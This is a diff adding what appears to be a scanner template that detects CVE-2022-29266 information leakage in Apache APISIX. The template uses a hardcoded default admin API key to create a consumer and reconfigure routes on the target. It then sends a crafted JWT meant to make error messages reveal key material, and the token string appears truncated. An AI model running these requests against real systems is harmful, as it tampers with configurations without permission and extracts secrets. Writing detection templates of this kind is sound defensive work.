@@ -1,0 +1,120 @@
+id: cve-2022-29266
+info:
+  name: Apache APISIX Sensitive Information Leakage (CVE-2022-29266)
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Apache APISIX index.html file can expose sensitive information due to improper handling of error messages, allowing attackers to retrieve sensitive configuration data.
+  reference:
+    - https://lists.apache.org/thread/6qpfyxogbvn18g9xr8g218jjfjbfsbhr
+
+variables:
+  apisix_api_key: edd1c9f034335f136f87ad84b625c8f1
+  jwt_token: |
+    eyJ0eXAiOiJKV1QiLCJ4NWMiOlsiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cclxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3WFhLa1hGOThlVEh6ZVJOUGhZK1xyXG54RnBob0dwWE05S2FLbENLdlVYd3Qwd0xBRUowRFwvVFZZbE42NnFRcnlQTXIySmR1RnV1U2tUcUo1cWFnK1U1cVxyXG5cLzJnU0kxKzhwSXR2eWZKVVZWb1wvV1FmOVk5YjFSVms4N1M5QmVJZHF1TE1cLzd1ZUNtZzdrYUpxZW1HK1lhTGd6XHJcbkhGc1wvOEVxSjA0UHJwZkdDR1JhaGhZMnZRTFBLekNcL3BZVW9UWlhHUXhWdGRib1QzRDNtOUxWYmdJV0l6RVFlblxyXG45ZzcySFhTc1FqWkZwWk9vK0tDSkJvaXhzdHY0OFFRUzd0eFR2SlRmdXBYd2MxeTN0NHUrZld4dGJPYktwVXMzXHJcbkluN2Vwc2xsQlJYaHFpWTNYTkhSSzRCTGJxRjBZM1hicHlCQ0I0OVVJOU54eEVMc1oxTXd0MU1cL1lmMnNydE10XHJcbmlRSURBUUFCXHJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSJdLCJhbGciOiJSUzI1NiJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTY1MDY5MzY5Mn0.T
+
+http:
+  - id: create-consumer
+    method: PUT
+    path:
+      - "/apisix/admin/consumers"
+    headers:
+      X-API-KEY: "{{apisix_api_key}}"
+      Content-Type: application/json
+    body: |
+      {
+        "username": "jack",
+        "plugins": {
+          "jwt-auth": {
+            "key": "user-key",
+            "secret": "my-secret-key"
+          }
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "jwt-auth"
+      - type: dsl
+        dsl:
+          - "status_code == 200 || status_code == 201"
+      - type: word
+        part: body
+        words:
+          - "algorithm"
+
+  - id: configure-route-jwt
+    method: PUT
+    path:
+      - "/apisix/admin/routes/jas"
+    headers:
+      X-API-KEY: "{{apisix_api_key}}"
+      Content-Type: application/json
+    body: |
+      {
+        "uri": "/apisix/plugin/jwt/sign",
+        "plugins": {
+          "public-api": {}
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "plugins"
+          - "public-api"
+      - type: dsl
+        dsl:
+          - "status_code == 200 || status_code == 201"
+
+  - id: configure-route-html
+    method: PUT
+    path:
+      - "/apisix/admin/routes/1"
+    headers:
+      X-API-KEY: "{{apisix_api_key}}"
+      Content-Type: application/json
+    body: |
+      {
+        "methods": ["GET"],
+        "uri": "/index.html",
+        "plugins": {
+          "jwt-auth": {}
+        },
+        "upstream": {
+          "type": "roundrobin",
+          "nodes": {
+            "127.0.0.1:80": 1
+          }
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "jwt-auth"
+          - "upstream"
+      - type: dsl
+        dsl:
+          - "status_code == 200 || status_code == 201"
+
+  - id: retrieve-sensitive-info
+    method: GET
+    path:
+      - "/index.html"
+    headers:
+      Authorization: "{{jwt_token}}"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 401"
+      - type: word
+        part: body
+        words:
+          - "public key"
+          - "Decode secret is not a valid cert"
